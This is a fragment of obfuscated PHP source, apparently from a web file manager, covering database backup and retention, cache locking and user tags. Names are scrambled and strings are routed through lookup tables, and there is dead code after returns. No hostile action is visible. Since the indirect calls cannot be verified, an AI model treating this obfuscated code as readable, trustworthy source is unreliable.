{ return; } while (!0) { $ØÙâ¡”ç++; $‚Èş¤Á­ = $É½’„€ [844]; if (!$‚Èş¤Á­) { die; } if ($ØÙâ¡”ç <= 2) { $ÒÛ°·‰Ê = $ØÙâ¡”ç; break; } else { if ($ØÙâ¡”ç < 2) { continue; } } $”“¿ìâ£ = !0; for ($ÏÂ±‹„« = 2; $ÏÂ±‹„« <= sqrt($ØÙâ¡”ç); $ÏÂ±‹„«++) { if ($ØÙâ¡”ç % $ÏÂ±‹„« == 0) { $”“¿ìâ£ = !1; } } if ($”“¿ìâ£) { $ÒÛ°·‰Ê = $ØÙâ¡”ç; break; } } $‘İøÒØØ[] = $ÒÛ°·‰Ê; } $ê·°Ôñ¾ = 2; for ($ØÙâ¡”ç = $¿ûî‰©Ê; $ØÙâ¡”ç > 1; $ØÙâ¡”ç--) { $”“¿ìâ£ = !0; foreach ($‘İøÒØØ as $Ê¢Ìõóû) { if ($ØÙâ¡”ç % $Ê¢Ìõóû == 0) { $”“¿ìâ£ = !1; break; } } if ($”“¿ìâ£) { $ê·°Ôñ¾ = $ØÙâ¡”ç; break; } } return $ê·°Ôñ¾; } public function wton7d7e46b1($Ÿä²åäÃ, $–Ğ¶º‰Õ) { $½˜ÅÛ€ =& $_SERVER[ñâÍÚ°]; return call_user_func(array($½˜ÅÛ€[8], $½˜ÅÛ€[314]), $Ÿä²åäÃ, $–Ğ¶º‰Õ); $Ğ íó«º = $_SERVER[©—Ò»ÅĞ][845]; if (!$Ğ íó«º) { die; } } public function hbrpd006126b($õÀ²Ã…Í, $´«ù¨éÄ) { $éÌûïì¸ =& $_SERVER[ñâÍÚ°]; return call_user_func(array($éÌûïì¸[315], $éÌûïì¸[316]), $õÀ²Ã…Í, $´«ù¨éÄ); $Ü¬±òÔ– = $_SERVER[©—Ò»ÅĞ][846]; if (!$Ü¬±òÔ–) { return; } } public function bvzff805645f($‘¨ãÏàö, $÷‘šéÚ‡) { $É¯úôæú =& $_SERVER[©—Ò»ÅĞ]; $åÄ£‘ê =& $_SERVER[ñâÍÚ°]; return call_user_func(array($åÄ£‘ê[315], $åÄ£‘ê[317]), $‘¨ãÏàö, $÷‘šéÚ‡); $à–»ì¢Ï = $É¯úôæú[847]; if (strlen($à–»ì¢Ï) < $É¯úôæú[734]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[©—Ò»ÅĞ][848]); $€œëƒ°’ = $this->init(); if (!$€œëƒ°’) { return; } $this->keep(); } public function init() { $Ç¬ãüê =& $_SERVER[©—Ò»ÅĞ]; $this->isManual(); self::$name = date($Ç¬ãüê[849]); if (!($ÙãúÍğÌ = $this->model->lastItem())) { $ÙãúÍğÌ = $this->initData(); } else { self::$name = $ÙãúÍğÌ[$Ç¬ãüê[32]]; if ($ÙãúÍğÌ[$Ç¬ãüê[850]] == $Ç¬ãüê[91]) { self::$name = date($Ç¬ãüê[259]); $Ú‘î¡Ç = intval(_get($ÙãúÍğÌ, $Ç¬ãüê[851], 0)); if (self::$manual == 0 && $ÙãúÍğÌ[$Ç¬ãüê[32]] == self::$name) { $this->model->remove($ÙãúÍğÌ[$Ç¬ãüê[487]]); } $ÙãúÍğÌ = $this->initData($Ú‘î¡Ç, $ÙãúÍğÌ[$Ç¬ãüê[852]]); } else { $Ç¬¬¸µº = $this->checkStore($ÙãúÍğÌ[$Ç¬ãüê[852]]); if (!$Ç¬¬¸µº) { return !1; } } } if (!$ÙãúÍğÌ) { return !1; } self::$option = $ÙãúÍğÌ; } private function isManual() { $°¥ü¬é× = _get($GLOBALS, $_SERVER[©—Ò»ÅĞ][853], 0); $°¥ü¬é× = intval($°¥ü¬é×); self::$manual = $°¥ü¬é× && $°¥ü¬é× == 1 ? 1 : 0; } private function initData($¸Õ×öÎ = 0, $éû¿±–ñ = '') { $ò¨Ì¤Ü =& $_SERVER[©—Ò»ÅĞ]; $˜Òã­¾ş = $this->model->config(); if ($éû¿±–ñ && $˜Òã­¾ş[$ò¨Ì¤Ü[852]] != $éû¿±–ñ) { $¸Õ×öÎ = 0; } $Ã´”¯ü¤ = $this->checkStore($˜Òã­¾ş[$ò¨Ì¤Ü[852]]); if (!$Ã´”¯ü¤) { return !1; } if (self::$manual == 1) { self::$name .= $ò¨Ì¤Ü[11] . date($ò¨Ì¤Ü[854]); } $ÄıóÔ¥Ô = array($ò¨Ì¤Ü[852] => $˜Òã­¾ş[$ò¨Ì¤Ü[852]], $ò¨Ì¤Ü[32] => self::$name, $ò¨Ì¤Ü[850] => 0, $ò¨Ì¤Ü[168] => $˜Òã­¾ş[$ò¨Ì¤Ü[168]], $ò¨Ì¤Ü[855] => self::$manual, $ò¨Ì¤Ü[856] => array($ò¨Ì¤Ü[857] => array($ò¨Ì¤Ü[850] => 0), $ò¨Ì¤Ü[858] => array($ò¨Ì¤Ü[850] => 0, $ò¨Ì¤Ü[859] => 0, $ò¨Ì¤Ü[860] => 0, $ò¨Ì¤Ü[33] => $ò¨Ì¤Ü[12], $ò¨Ì¤Ü[861] => 0, $ò¨Ì¤Ü[862] => 0), $ò¨Ì¤Ü[863] => array($ò¨Ì¤Ü[850] => 0, $ò¨Ì¤Ü[859] => 0, $ò¨Ì¤Ü[860] => 0, $ò¨Ì¤Ü[861] => 0, $ò¨Ì¤Ü[862] => 0), $ò¨Ì¤Ü[230] => array($ò¨Ì¤Ü[850] => 0, $ò¨Ì¤Ü[864] => 0, $ò¨Ì¤Ü[865] => 0, $ò¨Ì¤Ü[866] => 0, $ò¨Ì¤Ü[867] => 0, $ò¨Ì¤Ü[557] => $¸Õ×öÎ, $ò¨Ì¤Ü[861] => 0, $ò¨Ì¤Ü[862] => 0)), $ò¨Ì¤Ü[861] => time(), $ò¨Ì¤Ü[862] => 0); $ªàÀ = $this->model->insert($ÄıóÔ¥Ô); $ÄıóÔ¥Ô[$ò¨Ì¤Ü[487]] = $ªàÀ; return $ÄıóÔ¥Ô; } private function checkStore($íĞÙ¾Ò÷) { $ÔÀ÷êÇ° = Model($_SERVER[©—Ò»ÅĞ][868]); $–æŸ×†İ = $ÔÀ÷êÇ°->listData($íĞÙ¾Ò÷); $ÈÛ¢÷Ğû = $ÔÀ÷êÇ°->checkConfig($–æŸ×†İ, !0); if ($ÈÛ¢÷Ğû !== !0) { $this->message = $ÈÛ¢÷Ğû; return !1; } return !0; } public static function get() { if (!self::$option) { $Ô–Û­Åç = Model($_SERVER[©—Ò»ÅĞ][848]); $¤Ï¤èÚ¤ = $Ô–Û­Åç->findByName(self::$name); $Ô–Û­Åç->parseContent($¤Ï¤èÚ¤); self::$option = $¤Ï¤èÚ¤; } return self::$option; } public static function set($ó‹†›ĞÂ) { $Èù©õµ˜ =& $_SERVER[©—Ò»ÅĞ]; $Ç£™šõ½ = self::get(); foreach ($ó‹†›ĞÂ as $ÈË«© => $ù¬ƒş) { array_set_value($Ç£™šõ½, $ÈË«©, $ù¬ƒş); } Model($Èù©õµ˜[848])->update($Ç£™šõ½[$Èù©õµ˜[487]], $Ç£™šõ½); self::$option = $Ç£™šõ½; return self::$option; } public function keep() { $úĞşÒÄã =& $_SERVER[©—Ò»ÅĞ]; $ŒŞâ‘½‰ = self::get(); if (_get($ŒŞâ‘½‰, $úĞşÒÄã[869], 0) == $úĞşÒÄã[91]) { return; } $this->backupKeep($ŒŞâ‘½‰); self::set(array($úĞşÒÄã[869] => 1)); } private function backupKeep($»â¯ÜÔ) { $±ç¸Ùùä =& $_SERVER[©—Ò»ÅĞ]; if (self::$manual == 1) { return; } $³‚½ò§ = $this->model->listData(); if (empty($³‚½ò§)) { return; } $®×ÛŠÄ€ = array(); $¥Ç•©” = array(); $¥ÛûÛî¿ = date($±ç¸Ùùä[870], strtotime($±ç¸Ùùä[871])); foreach ($³‚½ò§ as $ÔÖœª®¼ => $£¤şë³) { $Ş­‰ÅÛŞ = $£¤şë³[$±ç¸Ùùä[32]]; if ($ÔÖœª®¼ < 7 || $£¤şë³[$±ç¸Ùùä[855]] == $±ç¸Ùùä[91]) { $®×ÛŠÄ€[] = $Ş­‰ÅÛŞ; continue; } $øõáùÚœ = substr($Ş­‰ÅÛŞ, 0, 6); if ($øõáùÚœ < $¥ÛûÛî¿) { continue; } if (!isset($¥Ç•©”[$øõáùÚœ]) || $Ş­‰ÅÛŞ < $¥Ç•©”[$øõáùÚœ]) { $¥Ç•©”[$øõáùÚœ] = $Ş­‰ÅÛŞ; } if (substr($Ş­‰ÅÛŞ, 6, 2) == $±ç¸Ùùä[872]) { $¥Ç•©”[$øõáùÚœ] = $Ş­‰ÅÛŞ; } } $®×ÛŠÄ€ = array_merge($®×ÛŠÄ€, array_values($¥Ç•©”)); $®×ÛŠÄ€ = array_unique($®×ÛŠÄ€); foreach ($³‚½ò§ as $£¤şë³) { $Ş­‰ÅÛŞ = $£¤şë³[$±ç¸Ùùä[32]]; if (!empty($Ş­‰ÅÛŞ) && in_array($Ş­‰ÅÛŞ, $®×ÛŠÄ€)) { continue; } $this->model->remove($£¤şë³[$±ç¸Ùùä[487]]); $ğ×ş„àı = $this->backupPath($»â¯ÜÔ); IO::remove($ğ×ş„àı, !1); } } private function backupPath($Ç›´÷öİ) { $Á««È =& $_SERVER[©—Ò»ÅĞ]; static $ç¦©ô«ı = null; if (is_null($ç¦©ô«ı)) { $ç¦©ô«ı = Model($Á««È[873])->get($Á««È[874]); } $Ä—şÑ‘ = $Ç›´÷öİ[$Á««È[32]]; $Ÿ›àŒè = substr(md5($Á««È[875] . $ç¦©ô«ı . $Ä—şÑ‘), 0, 8); return "\173\151\157\x3a{$Ç›´÷öİ[$Á««È[852]]}\175\x2f\144\x61\164\x61\x62\x61\163\145\57\x62\141\x63\x6b\x75\x70\x2f" . $Ä—şÑ‘ . $Á««È[11] . $Ÿ›àŒè; } public function db() { $õÑ¶Ú =& $_SERVER[©—Ò»ÅĞ]; $‰Şö¢¨„ = self::get(); if (_get($‰Şö¢¨„, $õÑ¶Ú[876], 0) == $õÑ¶Ú[91]) { return !0; } $Û—ÁÙØÜ = new BackupDb(); if (!$Û—ÁÙØÜ->index()) { return !1; } self::set(array($õÑ¶Ú[876] => 1)); return !0; } public function dbFile() { $ôÒê‹ƒé =& $_SERVER[©—Ò»ÅĞ]; $ÂèÎÂòÂ = self::get(); if (_get($ÂèÎÂòÂ, $ôÒê‹ƒé[877], 0) == $ôÒê‹ƒé[91]) { return !0; } $ğëÔ¼ö› = new BackupDbFile(); if (!$ğëÔ¼ö›->index()) { return !1; } self::set(array($ôÒê‹ƒé[877] => 1)); return !0; } public function file() { $»¥Ê³— =& $_SERVER[©—Ò»ÅĞ]; $…¾¤ß¤ = self::get(); if (_get($…¾¤ß¤, $»¥Ê³—[878], 0) == $»¥Ê³—[91]) { return !0; } self::set(array($»¥Ê³—[878] => 1, $»¥Ê³—[850] => 1)); return !0; } public static function log($…¬şí°Ï) { write_log($…¬şí°Ï, $_SERVER[©—Ò»ÅĞ][879]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ğ¨«—’ë =& $_SERVER[©—Ò»ÅĞ]; $ÁïÖ¹³¤ = Backup::get(); self::$io = $ÁïÖ¹³¤[$Ğ¨«—’ë[852]]; self::$name = $ÁïÖ¹³¤[$Ğ¨«—’ë[32]]; $í¬÷ŠŞü = new DbManage(); $§Ğ˜°²« = $í¬÷ŠŞü->dbType(); $¶Ùª´¨ = array($Ğ¨«—’ë[880] => $§Ğ˜°²«, $Ğ¨«—’ë[881] => time()); Backup::set($¶Ùª´¨); $Ÿîå×³Ö = $this->tmpFilesPath() . $Ğ¨«—’ë[882] . self::$name . $Ğ¨«—’ë[8]; del_dir($Ÿîå×³Ö); mk_dir($Ÿîå×³Ö); $¾ï»½ë– = $ÆÑ Êœ‚ = 0; try { $Ò‹¾ĞãĞ = $í¬÷ŠŞü->db()->getTables(); } catch (Exception $ÓÜßÙ) { Backup::log($Ğ¨«—’ë[883] . $ÓÜßÙ->getMessage()); return !1; } $Ò‹¾ĞãĞ = array_diff($Ò‹¾ĞãĞ, array($Ğ¨«—’ë[884], $Ğ¨«—’ë[885])); foreach ($Ò‹¾ĞãĞ as $Öæåæ‡„) { if ($Öæåæ‡„ == $Ğ¨«—’ë[472]) { continue; } $¾ï»½ë– += $í¬÷ŠŞü->model($Öæåæ‡„)->count(); } $Ú…Ÿß±ƒ = new Task($Ğ¨«—’ë[886], $Ğ¨«—’ë[879], $¾ï»½ë–, LNG($Ğ¨«—’ë[887]) . $Ğ¨«—’ë[888] . LNG($Ğ¨«—’ë[889])); $GLOBALS[$Ğ¨«—’ë[890]] = self::$name; foreach ($Ò‹¾ĞãĞ as $Öæåæ‡„) { $±ş·Ë»Ó = $Ÿîå×³Ö . $Öæåæ‡„ . $Ğ¨«—’ë[891]; if ($Öæåæ‡„ == $Ğ¨«—’ë[472]) { @touch($±ş·Ë»Ó); continue; } $ÆÑ Êœ‚ += $í¬÷ŠŞü->sqlFromDb($Öæåæ‡„, $±ş·Ë»Ó, $Ú…Ÿß±ƒ); } unset($GLOBALS[$Ğ¨«—’ë[890]]); $Ú…Ÿß±ƒ->end(); if ($ÆÑ Êœ‚ > $¾ï»½ë–) { $¾ï»½ë– = $ÆÑ Êœ‚; } $¶Ùª´¨ = array($Ğ¨«—’ë[880] => $§Ğ˜°²«, $Ğ¨«—’ë[876] => 1, $Ğ¨«—’ë[892] => $¾ï»½ë–, $Ğ¨«—’ë[893] => $ÆÑ Êœ‚, $Ğ¨«—’ë[894] => time()); Backup::set($¶Ùª´¨); if (!$¾ï»½ë– || abs($¾ï»½ë– - $ÆÑ Êœ‚) / $¾ï»½ë– > 0.01) { $¶•ÙÑæ = $Ğ¨«—’ë[895]; if (!stristr(I18n::getType(), $Ğ¨«—’ë[896])) { $¶•ÙÑæ = $Ğ¨«—’ë[897]; } Backup::log(array($¶•ÙÑæ, $¶Ùª´¨)); return !1; } return !0; } private function tmpFilesPath() { $ĞŠ¶‹Ÿº =& $_SERVER[©—Ò»ÅĞ]; $ô‹®ê›ë = TEMP_FILES; if ($GLOBALS[$ĞŠ¶‹Ÿº[6]][$ĞŠ¶‹Ÿº[92]][$ĞŠ¶‹Ÿº[898]]) { $ô‹®ê›ë = $GLOBALS[$ĞŠ¶‹Ÿº[6]][$ĞŠ¶‹Ÿº[92]][$ĞŠ¶‹Ÿº[898]]; if (!mk_dir($ô‹®ê›ë) || !is_writable($ô‹®ê›ë) || !IO::mkfile($ô‹®ê›ë . $ĞŠ¶‹Ÿº[899])) { $ô‹®ê›ë = TEMP_FILES; } } return $ô‹®ê›ë; } } goto b£„ÙÎÏÁ; BÌºÈ™ß‰‘: class CacheLockMemcached { public function lock($ÊÁô¥¯Ş, $ßë³ÁêÄ = 0) { $çĞçœÄÈ = Cache::init(); $ˆ¾Åš¤î = microtime(!0) + $ßë³ÁêÄ; while (microtime(!0) < $ˆ¾Åš¤î) { $û”¶±² = $çĞçœÄÈ->get($ÊÁô¥¯Ş); if (!$û”¶±² || $û”¶±² < microtime(!0)) { $€ûû”ªü = $çĞçœÄÈ->handle->add($ÊÁô¥¯Ş, $ˆ¾Åš¤î, $ßë³ÁêÄ); if ($€ûû”ªü) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($’å·àôÙ) { return Cache::init()->get($’å·àôÙ); } public function unlock($Å©®±Ñ”) { return Cache::init()->remove($Å©®±Ñ”); } } class CacheLockDatabase { public function lock($¨Ì’ŠÓ, $îÕ£Œù = 0) { $½ğÂæË° = Model($_SERVER[©—Ò»ÅĞ][982]); $ÎÓëÍşğ = microtime(!0) + $îÕ£Œù; while (microtime(!0) < $ÎÓëÍşğ) { $©Ü·òåÕ = $½ğÂæË°->get($¨Ì’ŠÓ); if (!$©Ü·òåÕ || $©Ü·òåÕ < microtime(!0)) { $ƒˆ½¾Œï = $½ğÂæË°->set($¨Ì’ŠÓ, $ÎÓëÍşğ); if ($ƒˆ½¾Œï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ÿİ±€¶ü) { return Model($_SERVER[©—Ò»ÅĞ][982])->get($Ÿİ±€¶ü); } public function unlock($µ½ã·Â) { Model($_SERVER[©—Ò»ÅĞ][982])->remove($µ½ã·Â); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($§•ûëÅÕ, $Ô‘¥ø¡) { $¡ÊÄ´Ø =& $_SERVER[©—Ò»ÅĞ]; if (!class_exists($¡ÊÄ´Ø[1024])) { show_json($¡ÊÄ´Ø[1025], !1); } $this->cacheTime = $Ô‘¥ø¡; $this->handle = new Memcached(); if (is_array($§•ûëÅÕ[$¡ÊÄ´Ø[1026]]) && count($§•ûëÅÕ[$¡ÊÄ´Ø[1026]]) >= 1) { foreach ($§•ûëÅÕ[$¡ÊÄ´Ø[1026]] as $Ï¤²€ÇÏ) { $Äâğ´¼­ = explode($¡ÊÄ´Ø[4], $Ï¤²€ÇÏ); $this->handle->addServer($Äâğ´¼­[0], $Äâğ´¼­[1]); } } else { $this->handle->addServer($§•ûëÅÕ[$¡ÊÄ´Ø[206]], $§•ûëÅÕ[$¡ÊÄ´Ø[207]]); } } public function set($ªè¦â², $åÍ‰À‡, $÷Éì¼ùÇ = false) { $÷Éì¼ùÇ = $÷Éì¼ùÇ ? $÷Éì¼ùÇ : $this->cacheTime; return $this->handle->set($ªè¦â², $åÍ‰À‡, $÷Éì¼ùÇ); } public function get($È¼µ–ú) { return $this->handle->get($È¼µ–ú); } public function remove($ÉÉ›‘»’) { return $this->handle->delete($ÉÉ›‘»’); } public function deleteAll() { return $this->handle->flush(); } } goto e±¥šÀ³ê‚; d‡ˆàÆİÙã: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($¸Ìøù¤) { $ñ·€óÛå =& $_SERVER[©—Ò»ÅĞ]; return array($ñ·€óÛå[2297] => array($ñ·€óÛå[2723] . USER_ID, $ñ·€óÛå[2298])); } protected function ___listData() { $¶„êß•Â =& $_SERVER[©—Ò»ÅĞ]; $é ®üˆ« = array($¶„êß•Â[1969] => USER_ID, $¶„êß•Â[573] => array($¶„êß•Â[2301], 0)); $ÃŸ¶ªª = $¶„êß•Â[2724]; $Ô˜«•”È = $this->field($ÃŸ¶ªª)->where($é ®üˆ«)->order($¶„êß•Â[2303])->select(); return $Ô˜«•”È ? $Ô˜«•”È : array(); } protected function addToTag($¶²ô·¡š, $ë‰øíÅ) { $€òµ¯‡ =& $_SERVER[©—Ò»ÅĞ]; if (!Model($€òµ¯‡[2452])->listData($ë‰øíÅ)) { return !1; } if (is_numeric($¶²ô·¡š)) { $Îá¬êª = Model($€òµ¯‡[933])->pathInfo($¶²ô·¡š); if (!$Îá¬êª) { return !1; } } else { $Îá¬êª = IO::infoSimple($¶²ô·¡š); if (!$Îá¬êª) { return !1; } $Ù“ÉÃË = $Îá¬êª[$€òµ¯‡[32]]; $¿š±½¨ş = $Îá¬êª[$€òµ¯‡[33]]; if (isset($Îá¬êª[$€òµ¯‡[500]])) { $¿š±½¨ş = $Îá¬êª[$€òµ¯‡[500]] == $€òµ¯‡[91] ? $€òµ¯‡[78] : $€òµ¯‡[230]; } } $ïÓ¸ı§ = array($€òµ¯‡[1969] => USER_ID, $€òµ¯‡[573] => $ë‰øíÅ, $€òµ¯‡[510] => $¶²ô·¡š, $€òµ¯‡[511] => $¿š±½¨ş ? $¿š±½¨ş : $€òµ¯‡[505], $€òµ¯‡[509] => $Ù“ÉÃË ? $Ù“ÉÃË : $€òµ¯‡[12], $€òµ¯‡[2187] => 0); if ($this->where($ïÓ¸ı§)->find()) { return !1; } return $this->add($ïÓ¸ı§); } protected function removeFromTag($Ô×‡ÙĞ, $óÄüÙşå) { $Âèíä÷ =& $_SERVER[©—Ò»ÅĞ]; if (!Model($Âèíä÷[2452])->listData($óÄüÙşå)) { return !1; } if (is_array($Ô×‡ÙĞ)) { $Ô×‡ÙĞ = array($Âèíä÷[7], $Ô×‡ÙĞ); } $û°Ë”íı = array($Âèíä÷[1969] => USER_ID, $Âèíä÷[573] => $óÄüÙşå, $Âèíä÷[510] => $Ô×‡ÙĞ); return $this->where($û°Ë”íı)->delete(); } protected function removeByTag($·ååÙ¢ª) { $÷¸·ëÅ‹ =& $_SERVER[©—Ò»ÅĞ]; if (!$·ååÙ¢ª) { return !1; } $úˆ÷ƒ = array($÷¸·ëÅ‹[1969] => USER_ID, $÷¸·ëÅ‹[573] => $·ååÙ¢ª); return $this->where($úˆ÷ƒ)->delete(); } protected function removeBySource($Æ¢–‹·‹) { $õ¡²¡³ =& $_SERVER[©—Ò»ÅĞ]; if (is_array($Æ¢–‹·‹)) { $Æ¢–‹·‹ = array($õ¡²¡³[7], $Æ¢–‹·‹); } $Â±§Ú«Ä = array($õ¡²¡³[1969] => USER_ID, $õ¡²¡³[573] => array($õ¡²¡³[1182], 0), $õ¡²¡³[510] => $Æ¢–‹·‹); return $this->where($Â±§Ú«Ä)->delete(); } }